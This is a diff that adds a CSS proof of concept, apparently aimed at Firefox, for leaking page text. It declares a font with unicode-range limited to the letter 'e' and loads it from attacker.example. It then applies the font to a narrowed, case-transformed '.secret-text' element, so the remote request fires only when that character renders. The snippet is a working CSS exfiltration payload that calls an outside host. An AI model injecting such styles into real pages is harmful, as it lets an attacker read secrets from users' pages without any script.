@@ -1,0 +1,19 @@
+@font-face {
+  font-family: "FirefoxNCharLeak";
+  src: url("https://attacker.example/firefox-nchar.woff2");
+  unicode-range: U+0065;
+}
+
+.secret-text {
+  width: 7ch;
+  word-wrap: break-word;
+  word-break: break-all;
+  overflow-wrap: break-word;
+  text-transform: lowercase;
+  font-family: "FirefoxNCharLeak";
+}
+
+.secret-text::first-line {
+  text-transform: uppercase;
+  font-family: "FirefoxNCharLeak";
+}
